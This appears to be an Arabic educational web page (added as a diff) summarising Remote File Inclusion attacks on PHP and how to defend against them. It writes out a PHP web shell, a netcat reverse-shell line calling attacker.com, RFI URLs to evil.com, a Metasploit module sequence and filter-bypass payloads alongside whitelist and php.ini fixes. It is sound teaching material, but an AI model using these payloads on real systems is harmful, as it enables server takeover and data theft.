@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ملخص Bug Bounty Training - دليل RFI الشامل | رحومي البراهيم</title>
+  <meta name="description" content="ملخص عربي شامل لدليل Remote File Inclusion (RFI) - من سلسلة Bug Bounty Training. تعلم استغلال ثغرات RFI، تجاوز Blacklist، واستخدام Metasploit.">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://iraqrahomi.github.io/pages/book-bug-bounty-rfi.html">
+
+  <meta property="og:title" content="ملخص Bug Bounty Training - RFI">
+  <meta property="og:description" content="دليل Remote File Inclusion بالعربي">
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "ملخص Bug Bounty Training - دليل RFI",
+    "author": {"@type": "Person", "name": "رحومي البراهيم"},
+    "datePublished": "2026-02-27",
+    "inLanguage": "ar"
+  }
+  </script>
+
+  <link rel="icon" type="image/svg+xml" href="../assets/icons/favicon.svg">
+  <link rel="manifest" href="../manifest.json">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="../css/style.css">
+  <meta property="og:image" content="https://iraqrahomi.github.io/assets/og-image.png">
+  <meta property="og:title" content="ملخص Bug Bounty Training - دليل RFI الشامل | رحومي البراهيم">
+  <meta property="og:description" content="ملخص عربي شامل لدليل Remote File Inclusion (RFI) - من سلسلة Bug Bounty Training. تعلم استغلال ثغرات RFI، تجاوز Blacklist، واستخدام Metasploit.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://iraqrahomi.github.io/pages/book-bug-bounty-rfi.html">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ملخص Bug Bounty Training - دليل RFI الشامل | رحومي البراهيم">
+  <meta name="twitter:description" content="ملخص عربي شامل لدليل Remote File Inclusion (RFI) - من سلسلة Bug Bounty Training. تعلم استغلال ثغرات RFI، تجاوز Blacklist، واستخدام Metasploit.">
+  <meta name="twitter:image" content="https://iraqrahomi.github.io/assets/og-image.png">
+</head>
+<body class="bg-white text-slate-900">
+
+  <nav class="fixed top-0 left-0 right-0 z-50 bg-white/85 backdrop-blur-xl border-b border-slate-200">
+    <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+      <a href="../index.html" class="flex items-center gap-3">
+        <img src="../assets/icons/logo.svg" alt="CyberAr" class="h-10">
+      </a>
+      <div class="hidden md:flex items-center gap-6 text-sm">
+        <a href="../index.html" class="nav-link">الرئيسية</a>
+        <a href="tools.html" class="nav-link">الأدوات</a>
+        <a href="ctf.html" class="nav-link">التحديات</a>
+        <a href="books.html" class="nav-link">المكتبة</a>
+        <a href="blog.html" class="nav-link active">المقالات</a>
+      </div>
+    </div>
+  </nav>
+
+  <header class="pt-32 pb-12 px-6 bg-gradient-to-b from-red-50 to-white">
+    <div class="max-w-4xl mx-auto">
+      <nav class="text-sm text-slate-500 mb-6">
+        <a href="../index.html" class="hover:text-blue-600">الرئيسية</a>
+        <span class="mx-2">›</span>
+        <a href="books.html" class="hover:text-blue-600">المكتبة</a>
+        <span class="mx-2">›</span>
+        <span class="text-slate-700">RFI Guide</span>
+      </nav>
+
+      <div class="flex flex-wrap items-center gap-3 mb-6">
+        <span class="chip">ملخص كتاب</span>
+        <span class="chip-soft">Bug Bounty</span>
+        <span class="chip-soft">Web Security</span>
+        <span class="text-xs text-slate-500">📅 27 فبراير 2026 · ⏱️ 10 دقائق</span>
+      </div>
+
+      <h1 class="text-4xl md:text-5xl font-black mb-6 text-slate-900 leading-tight">
+        دليل <span class="section-title accent">Remote File Inclusion (RFI)</span>
+      </h1>
+
+      <p class="text-xl text-slate-600 leading-relaxed mb-8">
+        من سلسلة <strong>Bug Bounty Training</strong>. تعلم كيف يستغل المخترقون ثغرات RFI وكيف تحمي تطبيقاتك منها.
+      </p>
+
+      <div class="glass-card p-6 bg-red-50/40 border-red-200">
+        <div class="flex items-start gap-4">
+          <div class="w-14 h-14 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
+            <i class="fa-solid fa-triangle-exclamation text-white text-2xl"></i>
+          </div>
+          <div>
+            <p class="font-bold text-red-900 mb-1">⚠️ خطورة حرجة</p>
+            <p class="text-sm text-slate-700">ثغرة RFI تحصل على CVSS 9.8 - من أعلى الدرجات. تسمح للمهاجم بتنفيذ أوامر على الخادم (RCE) والسيطرة الكاملة عليه.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <article class="py-16 px-6">
+    <div class="max-w-3xl mx-auto prose-content">
+
+      <!-- ما هي RFI -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">؟</span>
+          ما هي Remote File Inclusion؟
+        </h2>
+        <p class="text-slate-700 leading-loose text-lg mb-4">
+          RFI هي ثغرة في تطبيقات PHP (وأحياناً لغات أخرى) تسمح للمهاجم <strong class="text-red-600">بتضمين ملف من خادم خارجي</strong> في التطبيق. لو التطبيق ما يفلتر المدخلات بشكل صحيح، المهاجم يقدر يحقن كود PHP ضار.
+        </p>
+
+        <div class="bg-slate-900 text-slate-100 p-5 rounded-lg font-mono text-sm overflow-x-auto mb-4" dir="ltr">
+          <p class="text-slate-400 text-xs mb-2">// مثال URL ضعيف:</p>
+          <p class="text-emerald-400">https://target.com/index.php?page=home.php</p>
+          <br>
+          <p class="text-slate-400 text-xs mb-2">// المهاجم يستغل:</p>
+          <p class="text-red-400">https://target.com/index.php?page=http://evil.com/shell.txt</p>
+        </div>
+
+        <div class="callout">
+          <p class="font-bold mb-2">⚠️ نتائج استغلال RFI:</p>
+          <ul class="text-sm text-slate-700 space-y-1">
+            <li>1. تنفيذ أوامر عن بُعد (RCE) - الأخطر</li>
+            <li>2. السيطرة الكاملة على الخادم</li>
+            <li>3. تشويه الموقع أو سرقة بيانات حساسة</li>
+            <li>4. تنفيذ هجمات Client-Side مثل XSS</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- ليش تحصل -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">؟</span>
+          ليش تحصل ثغرة RFI؟
+        </h2>
+
+        <p class="text-slate-700 mb-4 leading-loose">السبب الجذري: <strong class="text-red-600">كود PHP سيء يكتب بدون فلترة المدخلات</strong>. شوف الفرق:</p>
+
+        <div class="grid md:grid-cols-2 gap-4">
+          <div class="glass-card p-5 border-r-4 border-red-500">
+            <h3 class="font-black mb-3 text-red-700 flex items-center gap-2">
+              <i class="fa-solid fa-xmark"></i> كود ضعيف
+            </h3>
+            <pre class="bg-slate-900 text-slate-100 p-3 rounded text-xs font-mono overflow-x-auto" dir="ltr">// ❌ خطير جداً
+&lt;?php
+  $page = $_GET['page'];
+  include($page);
+?&gt;</pre>
+            <p class="text-xs text-red-600 mt-2">يسمح بتضمين أي ملف من الإنترنت</p>
+          </div>
+
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-3 text-emerald-700 flex items-center gap-2">
+              <i class="fa-solid fa-check"></i> كود آمن
+            </h3>
+            <pre class="bg-slate-900 text-slate-100 p-3 rounded text-xs font-mono overflow-x-auto" dir="ltr">// ✅ آمن - whitelist
+&lt;?php
+  $allowed = ['home', 'about', 'contact'];
+  $page = $_GET['page'] ?? 'home';
+  if (in_array($page, $allowed)) {
+    include("$page.php");
+  }
+?&gt;</pre>
+            <p class="text-xs text-emerald-600 mt-2">يقبل فقط الصفحات من القائمة المسموحة</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- كيف تستغل -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">⚡</span>
+          كيف يستغلها المهاجم؟
+        </h2>
+
+        <div class="space-y-6">
+          <!-- 1. Basic -->
+          <div class="glass-card p-6">
+            <h3 class="font-black text-lg mb-3 text-slate-900">1. الاستغلال الأساسي</h3>
+            <p class="text-slate-600 mb-3">المهاجم يرفع ملف PHP ضار على سيرفره الخاص، ثم يستدعيه عبر URL.</p>
+            <div class="bg-slate-900 text-slate-100 p-4 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              <p class="text-slate-400 mb-1"># على سيرفر المهاجم:</p>
+              <p class="text-emerald-400 mb-2">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.txt</p>
+              <p class="text-slate-400 mb-1"># المهاجم يفتح:</p>
+              <p class="text-red-400">http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=id</p>
+            </div>
+          </div>
+
+          <!-- 2. Reverse Shell -->
+          <div class="glass-card p-6">
+            <h3 class="font-black text-lg mb-3 text-slate-900">2. Reverse Shell عبر Netcat</h3>
+            <p class="text-slate-600 mb-3">لما يكون الـ RCE محقق، المهاجم يفتح اتصال عكسي على سيرفره.</p>
+            <div class="bg-slate-900 text-slate-100 p-4 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              <p class="text-slate-400 mb-1"># على سيرفر المهاجم (Terminal 1):</p>
+              <p class="text-emerald-400">nc -lvnp 4444</p>
+              <p class="text-slate-400 mb-1 mt-2"># في الـ URL:</p>
+              <p class="text-red-400">http://target.com/index.php?page=http://attacker.com/shell.txt</p>
+              <p class="text-slate-400 mb-1 mt-2"># shell.txt يحتوي:</p>
+              <p class="text-emerald-400">nc attacker.com 4444 -e /bin/bash</p>
+            </div>
+          </div>
+
+          <!-- 3. Metasploit -->
+          <div class="glass-card p-6">
+            <h3 class="font-black text-lg mb-3 text-slate-900">3. استغلال Metasploit</h3>
+            <p class="text-slate-600 mb-3">Metasploit عنده module جاهز لـ RFI.</p>
+            <div class="bg-slate-900 text-slate-100 p-4 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              <p class="text-emerald-400">use exploit/unix/webapp/php_include</p>
+              <p class="text-emerald-400">set RHOST target.com</p>
+              <p class="text-emerald-400">set PHPURI /index.php?page=XXpathXX</p>
+              <p class="text-emerald-400">set PATH /shell.txt</p>
+              <p class="text-emerald-400">exploit</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- تجاوز Blacklist -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">🛡️</span>
+          تجاوز Blacklist
+        </h2>
+        <p class="text-slate-700 mb-4">بعض التطبيقات تحاول فلترة http/https في الـ URL. المهاجم يلتف حولها بطرق ذكية:</p>
+
+        <div class="space-y-4">
+          <div class="glass-card p-5">
+            <h3 class="font-black mb-2 text-slate-900">الطريقة 1: Null Byte Attack</h3>
+            <div class="bg-slate-900 text-slate-100 p-3 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              http://target.com/index.php?page=http://attacker.com/shell.txt%00
+            </div>
+            <p class="text-xs text-slate-600 mt-2">في PHP قديم، null byte يقطع النص بعده ويتجاهل اللواحق</p>
+          </div>
+
+          <div class="glass-card p-5">
+            <h3 class="font-black mb-2 text-slate-900">الطريقة 2: SMB Server</h3>
+            <p class="text-sm text-slate-600 mb-2">لو التطبيق يحظر HTTP لكن يسمح بـ UNC paths (Windows):</p>
+            <div class="bg-slate-900 text-slate-100 p-3 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              http://target.com/index.php?page=\\\\attacker.com\\share\\shell.txt
+            </div>
+          </div>
+
+          <div class="glass-card p-5">
+            <h3 class="font-black mb-2 text-slate-900">الطريقة 3: URL Encoding</h3>
+            <div class="bg-slate-900 text-slate-100 p-3 rounded-lg font-mono text-xs overflow-x-auto" dir="ltr">
+              h%74tp://attacker.com/shell.txt
+            </div>
+            <p class="text-xs text-slate-600 mt-2">تشفير حرف أو أكثر من URL</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- الحماية -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-emerald-100 flex items-center justify-center text-emerald-600 font-black">🛡️</span>
+          كيف تحمي تطبيقك؟
+        </h2>
+
+        <div class="space-y-4">
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-2 text-slate-900">✅ 1. استخدم Whitelist صارمة</h3>
+            <p class="text-slate-600 text-sm">حدد الصفحات المسموح تضمينها بقائمة ثابتة. لا تقبل أي input حرفي.</p>
+          </div>
+
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-2 text-slate-900">✅ 2. عطّل allow_url_include</h3>
+            <div class="bg-slate-900 text-slate-100 p-3 rounded-lg font-mono text-xs overflow-x-auto mt-2" dir="ltr">
+              ; في php.ini
+              allow_url_include = Off
+              allow_url_fopen = Off
+            </div>
+            <p class="text-xs text-slate-600 mt-2">يمنع PHP من تضمين URLs خارجية بشكل افتراضي</p>
+          </div>
+
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-2 text-slate-900">✅ 3. استخدم دوال آمنة</h3>
+            <p class="text-slate-600 text-sm">بدل <code class="font-mono bg-slate-100 px-1 rounded">include()</code> استخدم خرائط ثابتة أو template engines.</p>
+          </div>
+
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-2 text-slate-900">✅ 4. WAF (Web Application Firewall)</h3>
+            <p class="text-slate-600 text-sm">ModSecurity أو Cloudflare WAF يقدر يكتشف محاولات RFI ويحظرها.</p>
+          </div>
+
+          <div class="glass-card p-5 border-r-4 border-emerald-500">
+            <h3 class="font-black mb-2 text-slate-900">✅ 5. تحديث PHP</h3>
+            <p class="text-slate-600 text-sm">PHP 5.3+ أصلح كثير من Null Byte attacks. استخدم إصدار حديث دائماً.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- للتدريب -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">🎯</span>
+          أين تتدرب عليها؟
+        </h2>
+
+        <div class="callout-blue">
+          <p class="text-slate-700 mb-3"><strong>⚠️ مهم جداً:</strong> طبّق على تطبيقات قانونية فقط! لا تختبر على مواقع بدون إذن.</p>
+          <ul class="text-sm text-slate-700 space-y-2">
+            <li>• <strong>DVWA:</strong> Damn Vulnerable Web Application - تطبيق متعمد ضعفه للتدريب</li>
+            <li>• <strong>bWAPP:</strong> أكثر من 100 ثغرة للتدريب</li>
+            <li>• <strong>PortSwigger Academy:</strong> مختبرات RFI/LFI مجانية</li>
+            <li>• <strong>HackTheBox:</strong> آلات تحاكي سيناريوهات حقيقية</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- CVEs & CVSS -->
+      <section class="mb-12">
+        <h2 class="text-3xl font-black mb-6 text-slate-900 flex items-center gap-3">
+          <span class="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 font-black">📊</span>
+          تصنيف الثغرة رسمياً
+        </h2>
+
+        <div class="overflow-x-auto">
+          <table class="w-full glass-card">
+            <thead class="bg-slate-100">
+              <tr>
+                <th class="px-4 py-3 text-right font-black text-slate-900">CWE</th>
+                <th class="px-4 py-3 text-right font-black text-slate-900">الوصف</th>
+              </tr>
+            </thead>
+            <tbody class="text-slate-700 text-sm">
+              <tr class="border-t border-slate-200">
+                <td class="px-4 py-3 font-mono">CWE-98</td>
+                <td class="px-4 py-3">التحكم غير السليم في اسم الملف لـ include/require في PHP</td>
+              </tr>
+              <tr class="border-t border-slate-200">
+                <td class="px-4 py-3 font-mono">CWE-20</td>
+                <td class="px-4 py-3">التحقق غير السليم من المدخلات</td>
+              </tr>
+              <tr class="border-t border-slate-200">
+                <td class="px-4 py-3 font-mono">CWE-200</td>
+                <td class="px-4 py-3">كشف معلومات حساسة لمستخدم غير مصرح له</td>
+              </tr>
+              <tr class="border-t border-slate-200 bg-red-50">
+                <td class="px-4 py-3 font-bold">CVSS Score</td>
+                <td class="px-4 py-3 font-bold text-red-700">9.8 - CRITICAL ⚠️</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+    </div>
+  </article>
+
+  <!-- CTA -->
+  <section class="py-16 px-6 bg-slate-50">
+    <div class="max-w-3xl mx-auto text-center">
+      <h2 class="text-3xl font-black mb-4 text-slate-900">تعلم تطبق تختبر بشكل أخلاقي</h2>
+      <p class="text-slate-600 mb-8 text-lg">دائماً على تطبيقات اختبارية بإذن كتابي</p>
+      <div class="flex flex-wrap justify-center gap-4">
+        <a href="ctf.html" class="btn-primary">
+          <i class="fa-solid fa-flag ml-2"></i>
+          منصات CTF للتدريب
+        </a>
+        <a href="books.html" class="btn-secondary">
+          <i class="fa-solid fa-book ml-2"></i>
+          المكتبة الكاملة
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <footer class="py-12 px-6 border-t border-slate-200 text-center">
+    <p class="text-slate-500 text-sm">© 2025 رحومي البراهيم | صُنع بـ 💙 للمجتمع العربي</p>
+  </footer>
+
+</body>
+</html>
